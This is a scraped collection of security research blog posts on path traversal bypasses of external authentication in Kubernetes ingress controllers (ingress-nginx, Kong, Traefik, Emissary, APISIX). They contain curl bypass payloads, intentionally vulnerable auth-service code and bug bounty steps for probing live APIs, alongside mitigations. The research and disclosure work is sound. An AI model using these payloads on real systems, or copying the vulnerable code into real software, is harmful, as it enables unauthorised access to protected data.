[{"content":" In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557. I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative. They asked me to create normal issue in github as this behavior is considered as not security issue. For me this is still an issue of insecure design.\nJust look on values of X-Original-Url and X-Auth-Request-Redirect that are send to external auth service:\n1 2 3 4 5 6 7 8 9 10 11  X-Request-Id: 7d979c82ca55141ed0d58655fbaac586 Host: auth-service.default.svc.cluster.local X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected X-Original-Method: GET X-Sent-From: nginx-ingress-controller X-Real-Ip: 192.168.99.1 X-Forwarded-For: 192.168.99.1 X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected Connection: close User-Agent: curl/7.75.0 Accept: */*   Root cause of the problem, is how nginx is handling $request_uri variable. It\u0026rsquo;s documented very \u0026ldquo;frugal\u0026rdquo;:\n For me it\u0026rsquo;s not enough. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it\u0026rsquo;s obvious that $request_uri is not normalized and developers should take care of their projects üòï. This would be perfect world, but we are not living in such. Just compare it with documentation in envoy:\n rejecting-client-requests-with-escaped-slashes - although it\u0026rsquo;s not directly for Emissary. It\u0026rsquo;s describing well envoy concerts for escaped slashes GHSA-xcx5-93pw-jw2w (CVE-2019‚Äì9901)‚Ää-‚Äädescription of risks associated with normalizing paths in envoy envoy http connection manager options‚Ää-‚Äälook for two particular: normalize_path and path_with_escaped_slashes_action  If you thinks similar. Put your comment in https://github.com/kubernetes/ingress-nginx/issues/8644\nSetting the¬†stage install ingress-nginx into Kubernetes: 1 2 3  helm upgrade --install ingress-nginx ingress-nginx \\  --repo https://kubernetes.github.io/ingress-nginx \\  --namespace ingress-nginx --create-namespace   In case of problems follow official guide.\ndeploy test application 1 2  kubectl apply -f \\  https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml   [optional] forward ingress port 1 2  kubectl port-forward service/ingress-nginx-controller \\  -n ingress-nginx 8080:80   verify services First public service. It should be available without authentication:\n1 2  $ curl http://127.0.0.1:8080/public-service/public -H \u0026#34;Host: app.test\u0026#34; {\u0026#34;data\u0026#34;:\u0026#34;public data\u0026#34;}   and now protected:\n1 2 3 4 5 6 7 8 9 10 11 12  $ curl http://127.0.0.1:8080/protected-service/protected -H \u0026#34;Host: app.test\u0026#34; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Authorization Required\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;401 Authorization Required\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl http://127.0.0.1:8080/protected-service/protected \\  -H \u0026#34;X-Api-Key: secret-api-key\u0026#34; -H \u0026#34;Host: app.test\u0026#34; {\u0026#34;data\u0026#34;:\u0026#34;protected data\u0026#34;}   as you can see I need to provide \u0026ldquo;secret-api-key\u0026rdquo; to get resource.\nExploitation Let\u0026rsquo;s send request with path traversal\n1 2 3 4  $ curl \\  --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected -H \u0026#34;Host: app.test\u0026#34; {\u0026#34;data\u0026#34;:\u0026#34;protected data\u0026#34;}   As you can see, I was able to bypass uri restrictions üòÑ\nAuthentication service Of course not all authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13  @app.route(\u0026#39;/verify\u0026#39;) def verify(): print(request.headers, file=sys.stderr) api_key = request.headers.get(\u0026#39;X-Api-Key\u0026#39;) request_redirect = request.headers.get(\u0026#39;X-Auth-Request-Redirect\u0026#39;) if request_redirect and request_redirect.startswith(\u0026#34;/public-service/\u0026#34;): return Response(status = HTTPStatus.NO_CONTENT) if api_key == \u0026#34;secret-api-key\u0026#34;: return Response(status = HTTPStatus.NO_CONTENT) return Response(status = HTTPStatus.UNAUTHORIZED)   and ingress is defined as:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:my-ingressannotations:kubernetes.io/ingress.class:\u0026#34;nginx\u0026#34;nginx.ingress.kubernetes.io/rewrite-target:/$1nginx.ingress.kubernetes.io/auth-url:http://auth-service.default.svc.cluster.local:8080/verifyspec:rules:- host:app.testhttp:paths:- path:/public-service/(.*)pathType:Prefixbackend:service:name:public-serviceport:number:8080- path:/protected-service/(.*)pathType:Prefixbackend:service:name:protected-serviceport:number:8080  Mitigation One thing is to not trust content of X-Original-Uri and X-Auth-Request-Redirect headers. But there is also nice variable that can be used: $service_name\n1 2 3 4 5 6 7 8 9 10 11 12  apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:my-ingressannotations:nginx.ingress.kubernetes.io/rewrite-target:/$1nginx.ingress.kubernetes.io/auth-url:http://auth-service.default.svc.cluster.local:8080/verifynginx.ingress.kubernetes.io/configuration-snippet:|more_set_input_headers \u0026#34;X-Forwarded-Scheme: $scheme\u0026#34;; more_set_input_headers \u0026#34;X-Forwarded-Uri: $uri\u0026#34;; more_set_input_headers \u0026#34;X-Forwarded-Prefix: $service_name\u0026#34;; more_set_input_headers \u0026#34;X-Forwarded-Host: $http_host\u0026#34;;  it allows to get name of service in kubernetes that is targeted by request and pass it to auth-url. This way it\u0026rsquo;s not manipulated!\nSummary I\u0026rsquo;m really happy that I have asked myself what is X-Auth-Request-Redirect header üôÇ This question took me for nice adventure, where I have checked source code of several ingress controllers.\nWhat is sad is how nginx is considering $request_uri and how hard is to convince both nginx and ingress-nginx team that this is real security problem.\nWhole code of this example is here https://github.com/xvnpw/k8s-ingress-auth-bypass.\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Emissary Path traversal in authorization context in Kong and F5 NGINX Bug bounty tips for nginx $request_uri path traversal bypass Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2022-05-29T16:59:02+01:00","permalink":"https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/","title":"External Authentication bypass in ingress-nginx"},{"content":" To successful bypass access control using path traversal in $request_uri, you need to have buggy authentication/authorization service. Buggy in a way it\u0026rsquo;s not normalizing url/uri that is part of access control decision. Let me find more of those on github that are relying on X-Original-Url. There is high chance that this header is populated from $request_uri variable and not protected in any way.\npomerium  Pomerium is an identity-aware proxy that enables secure access to internal applications.\n In research I was using pomerium in version 0.15.5.\nLet\u0026rsquo;s look into code. Here is how X-Original-Url header is used:\n Later this originalURL is taking part in decision based on polices. Policy definition can include path, which is key information here:\n As you can see there are two possibilities interesting for exploitation: Prefix and Regex.\nIn official docs you can find how to specify such policy:\n For now I\u0026rsquo;m not going to exploit it further as it quite complicated to setup environment for it. I cannot be 100% sure for successful exploitation, but I have strong indicators in code that it will occur.\nauthelia  Authelia is an open-source authentication and authorization server providing two-factor authentication and single sign-on (SSO) for your applications via a web portal. It acts as a companion for reverse proxies like nginx, Traefik or HAProxy to let them know whether requests should either be allowed or redirected to Authelia\u0026rsquo;s portal for authentication.\n In research I was using authelia in version 4.32.2.\nThe official description of the authelia perfectly matching my exploitation scenario. I just need to have policy based on path and no defense on X-Original-Url header.\nLet\u0026rsquo;s check code first:\n X-Original-Url header is take from request without much of validation and placed later as targetURL:\n After that targetURL is part of logic to make decision whether request is passed as is or required to be authenticated:\n In official documentation there is example of rule using in resource regex:\n For me, this case is very similar to pomerium. I will also not go deeper for now in exploitation. It\u0026rsquo;s visible for me, that authelia has strong indicator for successful exploitation, but one more time I cannot be 100% sure.\ntravisghansen/external-auth-server travisghansen/external-auth-server has primary function to help Kubernetes users to deal with different authentication schemas. In documentation I could find ideal case for bypass. It\u0026rsquo;s using request_js plugin to make decision based on X-Original-Url header:\n To be sure, whether any normalization is in place, I have checked code that is making this parentReqInfo object:\nIt\u0026rsquo;s in utils.js in function get_parent_request_info:\n I had some problems to run travisghansen/external-auth-server in Kubernetes. Mostly because it\u0026rsquo;s quite complicated. So to really verify if it\u0026rsquo;s vulnerable, I have copied part of utils.js and tested only it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  \u0026#39;use strict\u0026#39;; const express = require(\u0026#39;express\u0026#39;); const utils = require(\u0026#39;./utils\u0026#39;) // Constants const PORT = 8080; const HOST = \u0026#39;0.0.0.0\u0026#39;; // App const app = express(); app.get(\u0026#39;/verify\u0026#39;, (req, res) =\u0026gt; { console.log(req.headers); const parentReqInfo = utils.get_parent_request_info(req); console.log(parentReqInfo); if (parentReqInfo.parsedUri.path.startsWith(\u0026#39;/public-service/\u0026#39;)) { res.statusCode = 200; res.send(); } const apiKey = req.headers[\u0026#39;X-Api-Key\u0026#39;]; if (apiKey == \u0026#34;secret-api-key\u0026#34;) { res.statusCode = 200; res.send(); } res.statusCode = 401; res.send(); }); app.listen(PORT, HOST); console.log(`Running on http://${HOST}:${PORT}`);   First send request using curl:\n1  curl -v http://app.test/public-service/..%2Fprotected-service/protected   Next check logs of auth-service:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  kubectl logs auth-service-node-859ccc54cc-8cnlp -f { \u0026#39;x-request-id\u0026#39;: \u0026#39;afd1f7fbc4c45c2db17cc1f72c5ec834\u0026#39;, host: \u0026#39;auth-service-node.default.svc.cluster.local\u0026#39;, \u0026#39;x-original-url\u0026#39;: \u0026#39;http://app.test/public-service/..%2Fprotected-service/protected\u0026#39;, \u0026#39;x-original-method\u0026#39;: \u0026#39;GET\u0026#39;, \u0026#39;x-real-ip\u0026#39;: \u0026#39;172.17.0.1\u0026#39;, \u0026#39;x-forwarded-for\u0026#39;: \u0026#39;172.17.0.1\u0026#39; }, { uri: \u0026#39;http://app.test/public-service/..%2Fprotected-service/protected\u0026#39;, parseduri: { scheme: \u0026#39;http\u0026#39;, userinfo: undefined, host: \u0026#39;app.test\u0026#39;, port: undefined, path: \u0026#34;/public-service/..%2Fprotected-service/protected\u0026#34;, query: undefined, fragment: undefined, reference: \u0026#39;absolute\u0026#39; }, parsedQuery: {}, method: \u0026#39;GET\u0026#39; }   First {‚Ä¶} is from console.log(req.headers) and second {‚Ä¶} is from console.log(parentReqInfo). Path is not normalized and wrong decision is made.\n I got protected data. One more time üòÖ\nSummary I have found three repositories that are using X-Original-Url header and are not protecting against manipulation.\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Emissary Path traversal in authorization context in Kong and F5 NGINX Bug bounty tips for nginx $request_uri path traversal bypass   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-28T10:58:59+01:00","permalink":"https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/","title":"Hunting for buggy authentication/authorization services on github"},{"content":" In this article, I will extend topic by bug bounty tips for weaknesses in authentication/authorization implementation in relation to nginx\u0026rsquo;s $request_uri variable.\nAPIs This vulnerability is for APIs. Best scenario are microservice deployed to Kubernetes and exposed by ingress controller.\nUsing paths API that you are playing with, need to use paths to address services, e.g.:\n1 2 3 4 5 6 7  OK! https://api.example.com/user-service https://api.example.com/customer-service ... NOT OK! https://user.example.com/ https://customer.example.com/   First set of URLs is good for exploitation, as you can try sending request with https://api.example.com/user-service/..%2F/customer-service/endpoint1\nUsing nginx based ingress controller In this point we have having two condition, using Kubernetes and using nginx based ingress controller, e.g.: kong, Apache APISIX, F5 NGINX.¬†Kubernetes is used in many organizations right now. If you see that API consists of multiply services, you can safely bet on Kubernetes as orchestration.¬†To verify if specific ingress is in place you can try to get error message, e.g.: curl --path-as-is https://api.example.com/sdalksjdeiu23432/cutomer-serivice/endpoint1\n This sdalksjdeiu23432 is just not existing service. You can see that there is nginx in response.\nNormalization of¬†../ and¬†..%2F It\u0026rsquo;s good to check what is happening for normalization of paths. Between your machine and ingress could be other servers, e.g: additional proxies or WAF (Web Application Firewall).\n1 2 3  curl --path-as-is https://api.example.com/sdalksjdeiu23432/../cutomer-serivice/endpoint1 curl --path-as-is https://api.example.com/sdalksjdeiu23432/..%2F/cutomer-serivice/endpoint1 curl --path-as-is https://api.example.com/sdalksjdeiu23432/..%252Fcutomer-serivice/endpoint1 # double encoding   Comparing results could give you idea about path normalization.\nExternal authentication service This is quite hard to investigate. Idea behind external authentication service is about having it centralized. Having broken authentication proof (e.g. JWT) would issue 401/403 on ingress rather than on upstream.\nI would follow those steps:\n Login into application Get some request to backend service Change it in a way that authentication proof is broken. For JWT it would be just to place any character into it. Send changed request and see results  Something that you would like to see is:\n If you cannot get any indication whether centralized authentication is in place, you can also assume so and try to exploit.\nCentralized authorization Authentication service is checking if you are who you are talking to be. But authorization is making decisions about letting you do some action. Having it centralized in some way is necessary for exploitation. If backend services are doing access control on they own, there is no way to exploit it with presented bypass.\nYou can do assumption here, that there is centralized authorization and move on.\nExploitation Public service Try to find service that is handling requests for anyone. Without any authentication proof. Some kind of public service. If you have one, that\u0026rsquo;s good, if you don\u0026rsquo;t have there is still one thing you can do (described in next paragraph).\nOK. We have some public-service and also protected-service that is only for logged in users (e.g. with valid JWT token).¬†Do some tests:\n Take a valid request to protected service, e.g. /protected-service/protected?a=1 and change it to /public-service/..%2Fprotected-service/protected?a=1 but send it without any token.¬† Make token invalid and send request from point 1. Wait and make token expired and send request from point 1.  What responses did you get? In case of luck you are already getting valid response for point 1. If not maybe point 2 or 3 was successful for you. If not try with different public and protected services. If you still get no valid response it means that there is no vulnerability here.\nPrivilege escalation There could be implementation of centralized access control that is checking to which group/role user belong.\nIn this situation try following steps:\n Find endpoint that you cannot access.¬† Take a valid request with authentication proof (e.g. JWT). Send request to endpoint from point 1, but using path traversal described in previous paragraph.  If you didn\u0026rsquo;t success it means that there is no vulnerability here. Sadly‚Ä¶ ‚òπÔ∏è\nSummary I have presented steps that can be inspiration for you. Do not limit yourself and be creative. Happy hunting!\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Emissary Path traversal in authorization context in Kong and F5 NGINX Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-27T22:59:05+01:00","permalink":"https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/","title":"Bug bounty tips for nginx $request_uri path traversal bypass"},{"content":" In this part I will research another ingress controller based on nginx: ü¶ç kong. At the end of article I will mention in short F5 NGINX Ingress Controller.\nIn kong there is no explicit feature called external authentication, but developers gave possibility to create it using plugins.\nHere are some links describing this process:\n Custom Authentication and Authorization Framework with Kong aunkenlabs/kong-external-auth - repository with PoC of external-auth. It\u0026rsquo;s old and cannot be run as it with kong 2.6, which is latest at time of writing.  During analysis I have found two possible exploitation paths:\n using basic-auth and acl plugins - general idea is to create acl for route to protect service. I have tested it but, was not able to exploit üôÅ using custom plugin to implement external authentication  Custom Plugin I based my plugin on aunkenlabs/kong-external-auth, but made it compatible with kong 2.6 and align with my auth-service:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  local BasePlugin = require \u0026#34;kong.plugins.base_plugin\u0026#34; local http = require \u0026#34;resty.http\u0026#34; local ExternalAuthHandler = BasePlugin:extend() function ExternalAuthHandler:new() ExternalAuthHandler.super.new(self, \u0026#34;external-auth\u0026#34;) end function ExternalAuthHandler:access(conf) ExternalAuthHandler.super.access(self) local client = http.new() client:set_timeouts(conf.connect_timeout, send_timeout, read_timeout) local res, err = client:request_uri(conf.url, { method = \u0026#34;GET\u0026#34;, ssl_verify = false, headers = { [\u0026#34;X-Original-Uri\u0026#34;] = ngx.var.request_uri, [\u0026#34;X-Forwarded-Path\u0026#34;] = kong.request.get_path(), [\u0026#34;X-Forwarded-Method\u0026#34;] = kong.request.get_method(), [\u0026#34;X-Forwarded-Query\u0026#34;] = kong.request.get_raw_query(), [\u0026#34;X-Api-Key\u0026#34;] = kong.request.get_headers()[\u0026#34;X-Api-Key\u0026#34;] } }) if not res then return kong.response.exit(500) end if res.status ~= 200 then return kong.response.exit(401) end end ExternalAuthHandler.PRIORITY = 900 return ExternalAuthHandler   To load this plugin in Kubernetes deployment, read this guide: setting up custom plugins. I loaded it as ConfigMap and added reference to values.yaml.\nTest I\u0026rsquo;m using kong in version 2.6.0 and kong ingress in 2.0.5.\nThis what is most important is value of headers that are coming into auth-service.\nFirst payload: curl --path-as-is -v http://app.test/public-service/../protected-service/protected:\n and logs from auth-service:\n As you can see from image values of both headers are manipulated:\n1 2  X-Original-Uri: /public-service/../protected-service/protected X-Forwarded-Path: /public-service/../protected-service/protected   Why both headers are important? So first header is taken directly from ngx.var.request_uri but second one is taken using kong api: kong.request.get_path(). Result is a bit shocking for me as I was expecting to see normalized path in case of call to kong api. This is due fact that in kong source code there is path normalization implemented.\nIn case of second payload: curl -v http://app.test/public-service/..%2Fprotected-service/protected. There is no success:\n It\u0026rsquo;s interesting that kong is not url decoding %2F. What is even more interesting it\u0026rsquo;s decoding %2E to . ü§î\nThe 404 is coming from public-service:\n F5 NGINX Ingress Controller There is no dedicated feature for external authentication, but using annotations you can add it like this (read more):\n1 2 3 4 5 6 7 8 9 10 11 12  apiVersion:extensions/v1beta1kind:Ingressmetadata:annotations:nginx.org/location-snippets:|auth_request /auth;nginx.org/server-snippets:|location = /auth { return 200; }name:cafe-ingressnamespace:default  If you can add external auth, you can also add $request_uri as some header, which will effectively allow exploitation using path traversal.\nSummary After failed on exploitation with ingresses based on Traefik and envoy, I had mixed feelings about kong. This time I was successful üòÄ. From defenders perspective it\u0026rsquo;s good that acl plugin is not vulnerable. In external auth case, developers need to build custom plugin and authentication service without path normalization.\nKong developers are very explicit about get_path() function. In documentation there is info that it\u0026rsquo;s not normalized in anyway. This is clear indicator for creators of custom plugins: https://docs.konghq.com/gateway/2.6.x/pdk/kong.request/#kongrequestget_path. I have also check code of various kong plugins and they are secure. So the only valid case for exploitation is custom plugin using not normalized variables.\nHere my code if you want to try yourself: https://github.com/xvnpw/k8s-ingress-auth-bypass-kong\nF5 NGINX Ingress Controller is also suffering from request_uri being not normalized.\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Emissary Bug bounty tips for nginx $request_uri path traversal bypass Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-25T20:49:02+01:00","permalink":"https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/","title":"Path traversal in authorization context in Kong and F5 NGINX"},{"content":" After checking Apache APISIX and Traefik, for path traversal in authZ context, now I will research Emissary ingress.\nIn Emissary there is feature called Basic authentication, which is very similar to forward authentication discussed in Traefik.\n Emissary-ingress can authenticate incoming requests before routing them to a backing service.\n I can already tell you that Emissary is secure and you cannot bypass using path traversal. What is even better, it\u0026rsquo;s (and envoy) aware of this kind of security concern. There is full description in documentation. I encourage you to read it:\n rejecting-client-requests-with-escaped-slashes - although it\u0026rsquo;s not directly for Emissary. It\u0026rsquo;s describing well envoy concerts for escaped slashes GHSA-xcx5-93pw-jw2w (CVE-2019‚Äì9901)‚Ää-‚Äädescription of risks associated with normalizing paths in envoy envoy http connection manager options‚Ää-‚Äälook for two particular: normalize_path and path_with_escaped_slashes_action  Emissary is setting normalize_path to true and path_with_escaped_slashes_action to KEEP_UNCHANGED. Which is preventing from path traversal bypass.¬†In this place I would like to point out difference between Emissary ingress and Edge Stack. The latter is using Filter as authentication service. I did not cover it in my research.\nSetting the¬†stage Install Emissary ingress in Kubernetes:\n1 2 3  helm repo add datawire https://app.getambassador.io helm repo update kubectl create namespace emissary \u0026amp;\u0026amp; helm install emissary-ingress --devel --namespace emissary datawire/emissary-ingress \u0026amp;\u0026amp; kubectl -n emissary wait --for condition=available --timeout=90s deploy -lapp.kubernetes.io/instance=emissary-ingress   If you need more info check here.\nCheck if all emissary pods are running: kubectl get pods -n emissary\n Deploy listener:\n1 2 3 4 5 6 7 8 9 10 11 12  apiVersion:getambassador.io/v3alpha1kind:Listenermetadata:name:emissary-ingress-listener-8080namespace:emissaryspec:port:8080protocol:HTTPsecurityModel:XFPhostBinding:namespace:from:ALL  Deploy auth service definition and Emissary mappings:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  apiVersion:getambassador.io/v3alpha1kind:AuthServicemetadata:name:authenticationspec:auth_service:\u0026#34;http://auth-service.default.svc.cluster.local:8080\u0026#34;proto:httppath_prefix:\u0026#34;/verify\u0026#34;allowed_request_headers:- \u0026#34;X-Api-Key\u0026#34;---apiVersion:getambassador.io/v3alpha1kind:Mappingmetadata:name:public-servicespec:hostname:\u0026#34;app.test\u0026#34;prefix:/public-service/service:public-service:8080---apiVersion:getambassador.io/v3alpha1kind:Mappingmetadata:name:protected-servicespec:hostname:\u0026#34;app.test\u0026#34;prefix:/protected-service/service:protected-service:8080  Code for auth-service is changed:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  from flask import Flask, Response, request from http import HTTPStatus import sys app = Flask(__name__) @app.route(\u0026#39;/verify/\u0026lt;path:path\u0026gt;\u0026#39;) def verify(path): print(request.headers, file=sys.stderr) print(path, file=sys.stderr) api_key = request.headers.get(\u0026#39;X-Api-Key\u0026#39;) if path and path.startswith(\u0026#34;public-service/\u0026#34;): return Response(status = HTTPStatus.OK) if api_key == \u0026#34;secret-api-key\u0026#34;: return Response(status = HTTPStatus.OK) return Response(status = HTTPStatus.UNAUTHORIZED)   It\u0026rsquo;s not using headers as Traefik. Instead it\u0026rsquo;s passing requested uri as path into /verify route.\nTest Let\u0026rsquo;s check my payloads:\n1¬∞ payload curl -v http://app.test/public-service/..%2Fprotected-service/protected\n I have got 404. And logs from public-service are giving answer why:\n There is no route defined in public-service that is called /..%2Fprotected-service/protected üòÉ\nWhat was logged by auth-service:\n Everything is align. Prefix is public-service, %2F was not decoded (due to path_with_escaped_slashes_action envoy option) and auth-service got right path for decision.\n2¬∞ payload With second payload it\u0026rsquo;s a bit different as normalize_path envoy option is set to true.\ncurl --path-as-is -v http://app.test/public-service/../protected-service/protected\n This time it\u0026rsquo;s not 404, but 401. Why¬†? Path was normalized. Everywhere. Not only in routes decision making but also in authentication service. Let\u0026rsquo;s check logs from auth-service:\n Yep. Logs are confirming this.\nEmissary vs ingress authZ bypass‚Ää-‚Ää1¬†: 0 üòÉ\nSummary Emissary is resistant for ingress authZ bypass using path traversal. I\u0026rsquo;m impressed that both Emissary and envoy are aware of this concern. And whole documentation about it is in place. Also default configuration is secure. I was even looking how to change it to less secure, but didn\u0026rsquo;t find a way üòÖ\nVersions of components that I was¬†using: minikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043; Kubernetesa v1.22.2 on Docker 20.10.8; Emissary 2.0.4\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Traefik and HAProxy Path traversal in authorization context in Kong and F5 NGINX Bug bounty tips for nginx $request_uri path traversal bypass Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-24T19:59:02+01:00","permalink":"https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/","title":"Path traversal in authorization context in Emissary"},{"content":" In my previous post about Apache APISIX I have found path traversal in uri-blocker plugin. In this text I will focus on yet another ingress controller which is Traefik. It has feature called forward auth. At the end I will mention HAProxy ingress controller.\nFrom docs:\n The ForwardAuth middleware delegate the authentication to an external service. If the service response code is 2XX, access is granted and the original request is performed. Otherwise, the response from the authentication server is returned.\n  Setting the¬†stage First what we need to do is to install traefik in kubernetes:\n1 2 3 4 5 6 7 8 9  helm repo add traefik https://helm.traefik.io/traefik helm repo update kubectl create namespace traefik helm upgrade --install traefik \\  --namespace traefik \\  --set dashboard.enabled=true \\  --set rbac.enabled=true \\  --set=\u0026#34;additionalArguments={--api.dashboard=true,--log.level=INFO,--providers.kubernetesingress.ingressclass=traefik-internal,--serversTransport.insecureSkipVerify=true}\u0026#34; \\  traefik/traefik --version 10.6.2   If you need more info about installation check here and here.\nCheck if it\u0026rsquo;s up and running: kubectl get pods -n traefik\n Deployment yaml for ingress look like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  kind:IngressRouteapiVersion:traefik.containo.us/v1alpha1metadata:name:servicesnamespace:defaultspec:entryPoints:- webroutes:- match:Host(`app.test`) \u0026amp;\u0026amp; PathPrefix(`/public-service`)kind:Ruleservices:- name:public-serviceport:8080middlewares:- name:public-stripprefix- name:auth-service- match:Host(`app.test`) \u0026amp;\u0026amp; PathPrefix(`/protected-service`)kind:Ruleservices:- name:protected-serviceport:8080middlewares:- name:protected-stripprefix- name:auth-service---apiVersion:traefik.containo.us/v1alpha1kind:Middlewaremetadata:name:protected-stripprefixspec:stripPrefix:prefixes:- /protected-service---apiVersion:traefik.containo.us/v1alpha1kind:Middlewaremetadata:name:public-stripprefixspec:stripPrefix:prefixes:- /public-serviceapiVersion:traefik.containo.us/v1alpha1kind:Middlewaremetadata:name:auth-servicespec:forwardAuth:address:http://auth-service.default.svc.cluster.local:8080/verify  It\u0026rsquo;s using middleware that is specifying forwardAuth.\nauth-service code is here:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  from flask import Flask, Response, request from http import HTTPStatus import sys app = Flask(__name__) @app.route(\u0026#39;/verify\u0026#39;) def verify(): print(request.headers, file=sys.stderr) api_key = request.headers.get(\u0026#39;X-Api-Key\u0026#39;) forwarded_prefix = request.headers.get(\u0026#39;X-Forwarded-Prefix\u0026#39;) if forwarded_prefix and forwarded_prefix.startswith(\u0026#34;/public-service\u0026#34;): return Response(status = HTTPStatus.NO_CONTENT) if api_key == \u0026#34;secret-api-key\u0026#34;: return Response(status = HTTPStatus.NO_CONTENT) return Response(status = HTTPStatus.UNAUTHORIZED)   Test Traefik is using headers in communication with forwardAuth service.¬†Headers Those are:\n X-Forwarded-For X-Forwarded-Host X-Forwarded-Method X-Forwarded-Port X-Forwarded-Prefix X-Forwarded-Proto X-Forwarded-Server X-Forwarded-Uri X-Real-Ip  Quite a bit, and maybe also some potential for bugs.\nExploitation We are ready now to send some request and check how traefik is handling malicious payloads.\n1  curl -v http://app.test/public-service/..%2Fprotected-service/protected    This is interesting. I have got 404. Which is completely different then Apache APISIX. It\u0026rsquo;s returned by Python not traefik.¬†But which service got this request. Let\u0026rsquo;s check logs of public-service: kubectl logs public-service-7d56f8589d-59jqg\n Oh! So traefik is not normalizing requests before executing them. That is important observation.¬†And now logs from auth-service:\n The X-Forwarded-Prefix is containing right value: /public-service and X-Forwarded-Uri is not having /public-service at all.\nGood job traefik! üëç\nI checked second payload with: curl --path-as-is -v http://app.test/public-service/../protected-service/protected but no luck.\nHAProxy I did similar research for HAProxy based haproxy-ingress as it\u0026rsquo;s also having option for external authentication. Results were very similar to those from Traefik. No bypass is possible, as HAProxy is not normalizing paths by default.\nSummary Trying with different ingress-controller was quite a fun üòÉ However I was hoping for similar effect that I got with Apache APISIX.¬†Traefik is not normalizing request paths before executing them. In my exploitation this is defense preventing from bypassing forwardAuth.\nVersions of components that I was¬†using: minikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043; Kubernetesa v1.22.2 on Docker 20.10.8; traefik:2.5.3\nOther articles from this series  CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable Path traversal in authorization context in Emissary Path traversal in authorization context in Kong and F5 NGINX Bug bounty tips for nginx $request_uri path traversal bypass Hunting for buggy authentication/authorization services on github   Thanks for reading! You can follow me on Twitter.\n","date":"2021-11-23T22:38:58+01:00","permalink":"https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/","title":"Path traversal in authorization context in Traefik and HAProxy"},{"content":" In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.\nWhat is APISIX ? From official website:\n Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\n Why $request_uri ? This variable is many times used in authentication and authorization plugins. It\u0026rsquo;s not normalized, so giving a possibility to bypass some restrictions.\nIn Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it\u0026rsquo;s quite complicated. To prove that APISIX is vulnerable to path-traversal I will use uri-blocker plugin. I\u0026rsquo;m suspecting that other plugins are also vulnerable but this one is easy to use.\nSetting the¬†stage Install APISIX into Kubernetes. Use helm chart with version 0.7.2:\n1 2 3 4 5 6 7 8 9 10  helm repo add apisix https://charts.apiseven.com helm repo add bitnami https://charts.bitnami.com/bitnami helm repo update kubectl create ns ingress-apisix helm install apisix apisix/apisix \\  --set gateway.type=NodePort \\  --set ingress-controller.enabled=true \\  